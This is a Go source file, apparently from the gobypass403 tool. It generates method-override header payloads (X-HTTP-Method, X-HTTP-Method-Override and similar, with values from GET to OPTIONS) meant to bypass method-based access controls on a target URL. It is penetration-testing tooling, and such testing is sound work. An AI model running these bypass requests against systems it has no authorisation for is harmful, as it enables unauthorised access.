package payload

import (
	"github.com/slicingmelon/go-rawurlparser"
	GB403Logger "github.com/slicingmelon/gobypass403/core/utils/logger"
)

// methodOverrideValues is the researched method-override value set
// (research-acquisition-report.md §4.1): bup's http_headers_method uses
// GET POST PUT PATCH; nomore403 simpleheaders.txt and HackTricks add
// DELETE HEAD OPTIONS.
var methodOverrideValues = []string{
	"GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS",
}

// GenerateHeadersMethodPayloads generates method-override header payloads
// (research-acquisition-report.md §4.1): for every override header in
// header_http_methods.lst (X-HTTP-Method, X-HTTP-Method-Override,
// X-Method-Override), send it with each researched method value on the
// ORIGINAL request-target. Frameworks that honor these headers run the
// request as the override method while the front proxy still sees GET,
// slipping past method-based ACLs.
func (pg *PayloadGenerator) GenerateHeadersMethodPayloads(targetURL string, bypassModule string) []BypassPayload {
	var allJobs []BypassPayload

	parsedURL, err := rawurlparser.RawURLParse(targetURL)
	if err != nil {
		GB403Logger.Error().Msgf("Failed to parse URL: %s", targetURL)
		return allJobs
	}

	headerNames, err := ReadPayloadsFromFile("header_http_methods.lst")
	if err != nil {
		GB403Logger.Error().Msgf("Failed to read override header names: %v", err)
		return allJobs
	}

	rawURI := parsedURL.Path
	if parsedURL.Query != "" {
		rawURI += "?" + parsedURL.Query
	}

	for _, headerName := range headerNames {
		for _, methodValue := range methodOverrideValues {
			job := BypassPayload{
				OriginalURL:  targetURL,
				Method:       pg.method,
				Body:         pg.body,
				Scheme:       parsedURL.Scheme,
				Host:         parsedURL.Host,
				RawURI:       rawURI,
				BypassModule: bypassModule,
				Headers: []Headers{{
					Header: headerName,
					Value:  methodValue,
				}},
			}
			job.PayloadToken = GeneratePayloadToken(job)
			allJobs = append(allJobs, job)
		}
	}

	GB403Logger.Debug().BypassModule(bypassModule).Msgf("Generated %d payloads for %s", len(allJobs), targetURL)
	return allJobs
}
